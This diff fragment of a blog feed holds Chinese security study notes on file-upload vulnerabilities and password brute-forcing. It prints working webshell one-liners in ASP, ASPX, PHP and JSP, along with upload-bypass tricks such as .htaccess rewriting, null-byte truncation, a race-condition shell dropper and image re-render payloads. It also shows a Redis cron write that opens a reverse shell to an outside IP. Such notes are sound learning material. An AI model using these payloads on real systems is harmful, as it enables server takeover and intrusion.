+<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
+</ul>
+<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
+<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
+<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
+<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
+<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
+</ul>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
+<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
+<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
+<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
+<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
+<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
+<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
+<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
       <tags>
         <tag>网络安全</tag>
       </tags>
@@ -279,91 +364,6 @@
 <li>nc被誉为网络安全界的瑞士军刀，一个简单而有用的工具，通过使用TCP或UDP协议的网络数据连接去读写数据<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.211.55.2/2333 0&gt;&amp;1\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li>
 </ul>
 ]]></content>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>密码爆破</title>
-    <url>/posts/29527.html</url>
-    <content><![CDATA[<h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
-<li>抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
-</ul>
-<h3 id="简单的脱弱口令爆破："><a href="#简单的脱弱口令爆破：" class="headerlink" title="简单的脱弱口令爆破："></a>简单的脱弱口令爆破：</h3><p>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</p>
-<h3 id="带验证码爆破？"><a href="#带验证码爆破？" class="headerlink" title="带验证码爆破？"></a>带验证码爆破？</h3><p>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</p>
-<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
-<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
-</ul>
-<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
-<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
-</ul>
-<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/posts/29527/First.png" alt="例题"></p>
-<ul>
-<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/posts/29527/Second.png"></li>
-</ul>
-<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/posts/29527/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
-<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
-<li>application….from urlLencode</li>
-<li>payload打开密码字典以换行为分割</li>
-<li>批量请求，寻找flag</li>
-</ul>
-<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
-<li>token时间戳验证</li>
-</ul>
-<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/posts/29527/4.png"></p>
-<ul>
-<li>工具：PKAV HTTP Fuzzer</li>
-<li>验证码识别重放模式为单线程</li>
-<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
-</ul>
-<h2 id="防止爆破的方法"><a href="#防止爆破的方法" class="headerlink" title="防止爆破的方法"></a>防止爆破的方法</h2><ul>
-<li>多因素认证，爆破次数太多会锁定，但漏洞会导致管理也无法登录。</li>
-<li>sso————统一登陆认证</li>
-<li>加密</li>
-<li>token</li>
-<li>验证码</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/posts/2682.html</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
-<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
-<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
-<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
-<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
-<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
-</ul>
-<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
-<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
-<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
-<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
-<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
-</ul>
-<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
-<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
-<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
-<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
-<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
-<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
-<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
-<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
       <tags>
         <tag>网络安全</tag>
       </tags>
